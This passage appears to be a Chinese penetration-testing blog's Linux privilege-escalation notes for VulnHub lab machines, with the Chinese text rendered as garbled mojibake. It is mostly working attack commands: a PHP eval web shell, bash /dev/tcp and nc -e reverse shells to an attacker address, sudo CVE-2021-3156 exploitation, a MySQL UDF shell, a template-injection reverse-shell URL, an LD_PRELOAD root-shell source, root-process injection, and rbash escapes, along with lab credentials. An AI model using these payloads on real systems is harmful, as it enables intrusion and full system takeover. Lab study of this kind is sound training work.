href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></p><p>-è®¿é—®ç®¡ç†ï¼ˆWebå…¥å£ï¼‰ï¼š</p><p>adminer.php æ·»åŠ ç”¨æˆ·åå¯†ç  ç™»å½•åå° æ¨¡ç‰ˆ å†™å…¥Shell</p><p>function onStart(){</p><p>&#x2F;&#x2F;èšå‰‘è¿æ¥</p><p>eval($_POST[â€œpassâ€]);</p><p>}</p><p>-æ‰¾å¤‡ä»½å¯»çªç ´ï¼ˆå‡æƒï¼‰ï¼š</p><p>&#x2F;var&#x2F;backup&#x2F;app.ini.bak ä¿®æ”¹ç”¨æˆ·å¯†ç  ç™»å½•åå° å†™å…¥åå¼¹</p><p>bash -c â€œexec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;5555 0&gt;&amp;1â€ </p><p>-åˆ©ç”¨sudoææƒï¼ˆcveï¼‰ï¼š</p><p>sudo -l</p><p>sudo -u#-1 sqlite3 &#x2F;dev&#x2F;null â€˜.shell &#x2F;bin&#x2F;shâ€™</p><p>gitæºç æ³„éœ² &#x3D;&gt; æ‰¾åˆ°æ•°æ®åº“å¯†ç ï¼Œç™»å…¥ &#x3D;&gt; æ‰¾åˆ°cmsåå°ç”¨æˆ·å¯†ç ï¼Œæ”¹ä¸ºå·²çŸ¥å¯†ç  &#x3D;&gt; ç™»å…¥cmsåå°ï¼Œå†™shellï¼ˆä½æƒé™ï¼‰</p><p>giteaæ•°æ®åº“é…ç½®å¤‡ä»½æ–‡ä»¶æ³„éœ² &#x3D;&gt; è¿æ¥giteaæ•°æ®åº“ï¼Œæ‰¾åˆ°giteaçš„ç”¨æˆ·å¯†ç  &#x3D;&gt; ç™»å…¥giteaï¼Œå†™shellï¼ˆæ›´é«˜æƒé™ï¼‰ &#x3D;&gt; ææƒã€‚</p><p>3ã€SUDO-CVE</p><p>ç¯å¢ƒï¼škali2020</p><p>sudo: 1.8.2 - 1.8.31p2</p><p>sudo: 1.9.0 - 1.9.5p1</p><p>-åˆ¤æ–­ï¼šsudoedit -s &#x2F; æŠ¥é”™å­˜åœ¨</p><p>-åˆ©ç”¨ï¼š</p><p>git clone <a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p><p>cd CVE-2021-3156</p><p>make</p><p>chmod a+x sudo-hax-me-a-sandwich</p><p>.&#x2F;sudo-hax-me-a-sandwich 0</p><h3 id="Web-ç”¨æˆ·-UDFææƒ-æ•°æ®åº“ç±»å‹"><a href="#Web-ç”¨æˆ·-UDFææƒ-æ•°æ®åº“ç±»å‹" class="headerlink" title="Web&amp;ç”¨æˆ·-UDFææƒ&#x2F;&#x2F;æ•°æ®åº“ç±»å‹"></a>Web&amp;ç”¨æˆ·-UDFææƒ&#x2F;&#x2F;æ•°æ®åº“ç±»å‹</h3><p><a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p><a href="http://192.168.139.155/vendor/">http://192.168.139.155/vendor/</a></p><p>2ã€Webæƒé™è·å–ï¼š</p><p>searchsploit phpmailer &#x2F;&#x2F;kaliæ¼æ´åº“æŸ¥æ‰¾ï¼ŒæŸ¥æ‰¾å®Œä¹‹ååé¢ä¼šè·Ÿåˆ©ç”¨æ–‡ä»¶æˆ–è€…åˆ©ç”¨æ–¹æ³•ï¼Œ40969å°±æ˜¯åˆ©ç”¨è„šæœ¬</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724895498697-cd063987-ddd5-406d-b77e-8da84acca8f7.png"></p><p>find &#x2F; -name 40969.py   &#x2F;&#x2F;ä¿®æ”¹è„šæœ¬ç›¸å…³çš„ipåœ°å€å’Œåé—¨è·¯å¾„</p><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;40969.py p.py</p><p>python p.py</p><p>æ‹¿åˆ°webæƒé™</p><p>3ã€MYSQL-UDFææƒï¼š</p><p>å‰æï¼šéœ€è¦æ•°æ®åº“é«˜æƒé™</p><p>-ç¼–è¯‘UDF.so</p><p>searchsploit udf</p><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c . #å¤åˆ¶åˆ°å½“å‰æ‰€åœ¨æ–‡ä»¶å¤¹</p><p>gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc</p><p>python -m http.server 8080    æ”»å‡»æœºèµ·ä¸€ä¸ªpyæœåŠ¡å™¨è®©å¯¹æ–¹å»ä¸‹è½½   </p><p>-ä¸‹è½½åˆ°ç›®æ ‡ä¸Š</p><p>python -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</p><p>cd tmp</p><p>wget <a href="http://192.168.139.141:8080/udf.so">http://192.168.139.141:8080/udf.so</a></p><p>-è¿æ¥è¿›è¡Œå¯¼å‡ºè°ƒç”¨</p><p>mysql -uroot -pR@v3nSecurity   &#x2F;&#x2F;ç¿»é…ç½®æ–‡ä»¶ç¿»å‡ºæ¥çš„</p><p>select version(); #æŸ¥çœ‹mysqlç‰ˆæœ¬</p><p>select @@basedir; #ç¡®è®¤mysqlå®‰è£…ä½ç½®</p><p>show variables like â€˜%basedir%â€™; #ç¡®è®¤mysqlå®‰è£…ä½ç½®</p><p>show variables like â€˜%secure%â€™; #æŸ¥çœ‹å¯å¯¼å‡ºæ–‡ä»¶ä½ç½®ã€‚ &#x2F;&#x2F;çœ‹ä¸€ä¸‹secure_file_privæ˜¯å¦å…³é—­ï¼Œå¦‚æœå¼€å¯å†™å…¥æ–‡ä»¶åå—é™åˆ¶ï¼Œéœ€è¦å…³é—­çŠ¶æ€</p><p>show variables like â€˜%plugin%â€™; #æŸ¥æ‰¾æ’ä»¶ä½ç½® &#x2F;&#x2F;ä¸€ä¼šæŠŠudf.soææƒæ–‡ä»¶æ”¾åˆ°è¿™è¾¹</p><p>show variables like â€˜%compile%â€™; #æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p><p>use mysql;</p><h1 id="åˆ›å»ºxiaodiè¡¨"><a href="#åˆ›å»ºxiaodiè¡¨" class="headerlink" title="åˆ›å»ºxiaodiè¡¨"></a>åˆ›å»ºxiaodiè¡¨</h1><p>create table xiaodi(line blob);</p><h1 id="å¾€xiaodiè¡¨ä¸­æ’å…¥äºŒè¿›åˆ¶çš„udf-so"><a href="#å¾€xiaodiè¡¨ä¸­æ’å…¥äºŒè¿›åˆ¶çš„udf-so" class="headerlink" title="å¾€xiaodiè¡¨ä¸­æ’å…¥äºŒè¿›åˆ¶çš„udf.so"></a>å¾€xiaodiè¡¨ä¸­æ’å…¥äºŒè¿›åˆ¶çš„udf.so</h1><p>insert into xiaodi values(load_file(â€˜&#x2F;tmp&#x2F;udf.soâ€™));</p><h1 id="å¯¼å‡ºudf-so"><a href="#å¯¼å‡ºudf-so" class="headerlink" title="å¯¼å‡ºudf.so"></a>å¯¼å‡ºudf.so</h1><p>select * from xiaodi into dumpfile â€˜&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.soâ€™;&#x2F;&#x2F;è¿™é‡Œä¸ç›´æ¥ä¸‹è½½åˆ°pluginç›®å½•ä¸‹æ˜¯å› ä¸ºweb wgeté€šå¸¸åªèƒ½ä¸‹è½½åˆ°tmpç›®å½•ä¸‹ï¼Œå…¶ä»–ç›®å½•å¤§æ¦‚ç‡æ²¡æƒé™ ï¼Œåœ¨æ­¤ä¹‹å‰è®°å¾—chmodåŠ æ‰§è¡Œæƒé™</p><h1 id="åˆ›å»ºdo-systemè‡ªå®šä¹‰å‡½æ•°"><a href="#åˆ›å»ºdo-systemè‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="åˆ›å»ºdo_systemè‡ªå®šä¹‰å‡½æ•°"></a>åˆ›å»ºdo_systemè‡ªå®šä¹‰å‡½æ•°</h1><p>create function do_system returns integer soname â€˜udf.soâ€™;</p><p>select do_system(â€˜nc 192.168.139.141 6666 -e &#x2F;bin&#x2F;bashâ€™);</p><h3 id="Web-ç”¨æˆ·-Capabilityèƒ½åŠ›-ç†è§£ä¸ºSUIDå‡çº§ç‰ˆ"><a href="#Web-ç”¨æˆ·-Capabilityèƒ½åŠ›-ç†è§£ä¸ºSUIDå‡çº§ç‰ˆ" class="headerlink" title="Web&amp;ç”¨æˆ·-Capabilityèƒ½åŠ› &#x2F;&#x2F;ç†è§£ä¸ºSUIDå‡çº§ç‰ˆ"></a>Web&amp;ç”¨æˆ·-Capabilityèƒ½åŠ› &#x2F;&#x2F;ç†è§£ä¸ºSUIDå‡çº§ç‰ˆ</h3><p>åŸç†å‚è€ƒï¼š<a href="https://www.cnblogs.com/f-carey/p/16026088.html">https://www.cnblogs.com/f-carey/p/16026088.html</a></p><p>cp &#x2F;usr&#x2F;bin&#x2F;php &#x2F;tmp&#x2F;php</p><p>è®¾ç½®èƒ½åŠ›ï¼šsetcap cap_setuid+ep &#x2F;tmp&#x2F;php&#x2F;&#x2F;è®©&#x2F;tmp&#x2F;phpæœ‰suidæƒé™</p><p>åˆ é™¤èƒ½åŠ›ï¼šsetcap -r &#x2F;tmp&#x2F;php</p><p>æŸ¥çœ‹å•ä¸ªèƒ½åŠ›ï¼šgetcap &#x2F;usr&#x2F;bin&#x2F;php</p><p>æŸ¥çœ‹æ‰€æœ‰èƒ½åŠ›ï¼šgetcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724900446933-af6cfad0-a91a-4118-a2d7-390fc012bda9.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901611974-a20e2fea-6dac-46f3-8a0e-4654bd69e5a2.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901632225-67d2ff77-6a66-48aa-b8e2-50d5f9235252.png"></p><p>.&#x2F;tmp&#x2F;php -r â€œposix_setuid(0); system(â€˜&#x2F;bin&#x2F;shâ€™);â€</p><p>Hacker_Kid</p><p>WPå‚è€ƒï¼š<a href="https://www.jianshu.com/p/60673ac0454f">https://www.jianshu.com/p/60673ac0454f</a>é‡Œé¢åŒ…å«æŸ¥çœ‹èƒ½åŠ›çš„è§£é‡Š</p><p>ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p><p>webå…¥å£ç‚¹ï¼šè´¦å·å¯†ç </p><p>saket</p><p>Saket!#$%@!!</p>{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/192.168.139.141/6688 0>&1"')}}<p><a href="http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos.system(%27bash+-c+%22bash+-i+&%3E+/dev/tcp/192.168.139.141/6688+0%3E&1%22%27)%7D%7D">http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos%2Esystem%28%27bash+%2Dc+%22bash+%2Di+%26%3E+%2Fdev%2Ftcp%2F192%2E168%2E139%2E141%2F6688+0%3E%261%22%27%29%7D%7D</a></p><p>python2.7æ‹¥æœ‰cap_sys_ptraceæƒé™ï¼Œæ„å‘³ç€ä»–å¯ä»¥è°ƒè¯•åˆ«çš„è¿›ç¨‹</p><p>&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p><p>python -m http.server 8080</p><p>wget <a href="http://192.168.139.141:8080/inject.py">http://192.168.139.141:8080/inject.py</a></p><p>for i in <code>ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;</code>; do python2.7 inject.py $i; done&#x2F;&#x2F;æ³¨å…¥æ‰€æœ‰rootæƒé™è¿›ç¨‹</p><p>nc 192.168.139.156 5600</p><p>ç»“è®ºï¼šsuidå‡çº§ç‰ˆï¼Œæ›´ç»†è‡´çš„æƒé™åˆ’åˆ†ï¼Œé€šè¿‡èƒ½åŠ›æœ‰å“ªäº›æƒé™è®¾ç½®è¿›è¡Œåˆ©ç”¨</p><h3 id="æ™®é€šç”¨æˆ·-LD-PreloadåŠ è½½"><a href="#æ™®é€šç”¨æˆ·-LD-PreloadåŠ è½½" class="headerlink" title="æ™®é€šç”¨æˆ·-LD_PreloadåŠ è½½"></a>æ™®é€šç”¨æˆ·-LD_PreloadåŠ è½½</h3><p>&#x2F;&#x2F;åªä¸è¿‡linuxä¸­ç‰¹æœ‰çš„ï¼Œæ˜¯ç¨‹åºè¿è¡Œå‰å°±æŠŠè¦åŠ è½½çš„ç¨‹åºåŒ…æ‹¬äº†ï¼Œè¿™ä¸ªLD_Preloadæ˜¯è®©ç¨‹åºéœ€è¦çš„æ—¶å€™å†åŠ è½½ï¼Œå’Œdllææƒå·®ä¸å¤šï¼Œå½“sudoææƒæŸ¥æ‰¾åˆ°çš„æ˜¯ç¬¬ä¸‰æ–¹æ–‡ä»¶çš„æ—¶å€™é€‚ç”¨</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/backlion/p/10503985.html">https://www.cnblogs.com/backlion/p/10503985.html</a></p><p>ä¿®æ”¹&#x2F;etc&#x2F;sudoers</p><p>Defaults env_keep +&#x3D; LD_PRELOAD&#x2F;&#x2F;å…è®¸ç¨‹åºå¯ç”¨</p><p>test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find&#x2F;&#x2F;ç»™testç”¨æˆ·åœ¨è¿è¡Œfindå‘½ä»¤æ—¶æ‰€æœ‰çš„è¿è¡Œæƒé™ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç ç¡®å®š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span><br><span class="line">void <span class="emphasis">_init() &#123;</span></span><br><span class="line"><span class="emphasis">unsetenv(&quot;LD_</span>PRELOAD&quot;);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc -fPIC -shared -o shell.so shell.c -nostartfiles&#x2F;&#x2F;è‡ªå·±å†™ä¸€ä¸ªåŠ è½½æ–‡ä»¶</p><p>ls -al shell.so</p><p>sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so find&#x2F;&#x2F;åœ¨sudoè¿è¡Œfindæ˜¯åŠ è½½å†™å…¥çš„åŠ è½½æ–‡ä»¶</p><p>whoami</p><p>Defaults env_keep +&#x3D; LD_PRELOAD</p><p>test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;tmp&#x2F;LinEnum.sh</p><p>sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so &#x2F;tmp&#x2F;LinEnum.sh</p><p>ç»“è®ºï¼šsudoææƒæœ‰é™åˆ¶ï¼Œå¦‚æœsudoé‡Œé¢ç¬¬ä¸‰æ–¹æ–‡ä»¶å°±å¾—äºŒè¿›åˆ¶åˆ†æï¼Œéš¾åº¦è¾ƒå¤§ï¼Œä½†æ˜¯ä¸€æ—¦è®¾ç½®äº†LD_PRELOADï¼Œé‚£ä¹ˆåªè¦æœ‰ç¨‹åºæ—¢å¯ææƒ</p><h2 id="æ™®é€šç”¨æˆ·-Rbashç»•è¿‡"><a href="#æ™®é€šç”¨æˆ·-Rbashç»•è¿‡" class="headerlink" title="æ™®é€šç”¨æˆ·-Rbashç»•è¿‡"></a>æ™®é€šç”¨æˆ·-Rbashç»•è¿‡</h2><p>ä¼šç»™rbashç”¨æˆ·ç»„ä¸‹é¢éå¸¸ä½çš„æƒé™ï¼Œrbashæ˜¯linuxé™åˆ¶ç”¨æˆ·æƒé™çš„æŠ€æœ¯</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7642">https://xz.aliyun.com/t/7642</a></p><p>Rbash(The Restricted mode of bash),ä¹Ÿå°±æ˜¯é™åˆ¶å‹bash</p><p>åœ¨æ¸—é€æµ‹è¯•ä¸­å¯èƒ½é‡åˆ°rbashï¼Œå°è¯•ç»•è¿‡åæ‰èƒ½è¿›è¡Œåç»­æ“ä½œ</p><p>sudoadduser xiaodisec</p><p>sudo usermod -s &#x2F;bin&#x2F;rbash xiaodisec</p><p><a href="https://www.vulnhub.com/entry/funbox-rookie,520/">https://www.vulnhub.com/entry/funbox-rookie,520/</a></p><p>1ã€å…¥å£ç‚¹ï¼š</p><p>fscan -h 192.168.1.0&#x2F;24</p><p>ftp 192.168.1.8</p><p>get tom.zip(iubire)</p><p>ssh <a href="mailto:&#116;&#111;&#x6d;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#x2e;&#56;">&#116;&#111;&#x6d;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#x2e;&#56;</a> -i id_rsa</p><p>2ã€Rbashç»•è¿‡ï¼š</p><p>python -m http.server 8080</p><p>wget <a href="http://192.168.1.3:8080/LinEnum.sh">http://192.168.1.3:8080/LinEnum.sh</a></p><p>awk â€˜BEGIN {system(â€œ&#x2F;bin&#x2F;bashâ€)}â€™&#x2F;&#x2F;sudo</p><p>3ã€å†å²æ³„æ¼ææƒï¼š</p><p>.&#x2F;LinEnum.sh</p><p>cat &#x2F;home&#x2F;tom&#x2F;.mysql_history</p><p>su root(xx11yy22!)</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æƒé™æå‡ </tag>
            
            <tag> linux </tag>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
